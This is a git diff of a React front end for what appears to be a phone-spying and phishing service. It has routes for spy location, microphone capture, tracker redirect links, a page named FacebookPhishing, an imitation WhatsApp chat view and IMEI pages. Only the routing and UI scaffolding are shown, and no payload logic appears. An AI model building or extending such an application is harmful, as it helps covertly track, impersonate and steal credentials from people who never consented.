@@ -1,44 +1,4 @@
-import React, { useState } from 'react';
-import './global.css';
-import Login from './components/Login';
-import Dashboard from './components/Dashboard';
-import TrackerPage from './pages/TrackerPage';
-import FacebookPhishing from './pages/FacebookPhishing';
-import MicrophonePage from './pages/MicrophonePage';
-import HowToGetIMEI from './pages/HowToGetIMEI';
-import IMEISupportRequest from './pages/IMEISupportRequest';
-import { Routes, Route, useParams, useNavigate } from 'react-router-dom';
-import Header from './components/Header';
-import Sidebar from './components/Sidebar';
-import { FaBook, FaMapMarkerAlt, FaWhatsapp, FaInstagram, FaFacebookF, FaMicrophone, FaHome, FaQuestionCircle, FaLifeRing } from 'react-icons/fa';
 
-function WhatsAppChat() {
-  const { number } = useParams();
-  // Mensagens simuladas
-  const messages = [
-    { fromMe: false, text: 'last message', time: '21:13' },
-    { fromMe: true, text: 'last message', time: '21:14' },
-    { fromMe: false, text: 'last message', time: '21:15' },
-    { fromMe: true, text: 'last message', time: '21:16' },
-    { fromMe: false, text: 'last message', time: '21:17' },
-    { fromMe: true, text: 'last message', time: '21:18' },
-    { fromMe: false, text: 'last message', time: '21:19' },
-    { fromMe: true, text: 'last message', time: '21:20' },
-  ];
-  return (
-    <div style={{
-      minHeight: '100vh',
-      background: '#111b21 url("https://static.whatsapp.net/rsrc.php/v3/yl/r/8zQ2Wg6q4kN.png") repeat',
-      color: '#e9edef',
-      display: 'flex',
-      flexDirection: 'column',
-      alignItems: 'center',
-      justifyContent: 'flex-start',
-      fontFamily: 'Inter, Arial, sans-serif'
-    }}>
-      {/* Barra superior */}
-      <div style={{
-        width: '100%',
         maxWidth: 700,
         background: '#202c33',
         borderRadius: '0 0 14px 14px',
@@ -304,29 +264,32 @@ function App() {
   }
 
   return (
-    <Routes>
-      <Route path="/" element={
-        !usuario ? (
-          <Login onLogin={handleLogin} />
-        ) : (
-          <Dashboard email={usuario} />
-        )
-      } />
-      <Route path="/whatsapp" element={<Dashboard email={usuario} />} />
-      <Route path="/spy-location" element={<Dashboard email={usuario} />} />
-      <Route path="/facebook" element={<Dashboard email={usuario} />} />
-      <Route path="/microphone" element={<Dashboard email={usuario} />} />
-      <Route path="/instagram" element={<Dashboard email={usuario} />} />
-      <Route path="/lessons" element={<Dashboard email={usuario} />} />
-      <Route path="/faq" element={<Dashboard email={usuario} />} />
-      <Route path="/support" element={<Dashboard email={usuario} />} />
-      <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
-      <Route path="/imei-support-request" element={<IMEISupportRequest />} />
-      <Route path="/redirect/:id" element={<TrackerPage />} />
-      <Route path="/facebook/:id" element={<FacebookPhishing />} />
-      <Route path="/microphone/:id" element={<MicrophonePage />} />
-      <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
-    </Routes>
+    <BrowserRouter>
+      <Routes>
+        <Route path="/" element={
+          !usuario ? (
+            <Login onLogin={handleLogin} />
+          ) : (
+            <Dashboard email={usuario} />
+          )
+        } />
+        <Route path="/whatsapp" element={<Dashboard email={usuario} />} />
+        <Route path="/spy-location" element={<Dashboard email={usuario} />} />
+        <Route path="/facebook" element={<Dashboard email={usuario} />} />
+        <Route path="/microphone" element={<Dashboard email={usuario} />} />
+        <Route path="/instagram" element={<Dashboard email={usuario} />} />
+        <Route path="/lessons" element={<Dashboard email={usuario} />} />
+        <Route path="/faq" element={<Dashboard email={usuario} />} />
+        <Route path="/support" element={<Dashboard email={usuario} />} />
+        {/* Rotas especiais: NÃO renderize Dashboard aqui! */}
+        <Route path="/how-to-get-imei" element={<HowToGetIMEI />} />
+        <Route path="/imei-support-request" element={<IMEISupportRequest />} />
+        <Route path="/redirect/:id" element={<TrackerPage />} />
+        <Route path="/facebook/:id" element={<FacebookPhishing />} />
+        <Route path="/microphone/:id" element={<MicrophonePage />} />
+        <Route path="/whatsapp-chat/:number" element={<WhatsAppChat />} />
+      </Routes>
+    </BrowserRouter>
   );
 }
 
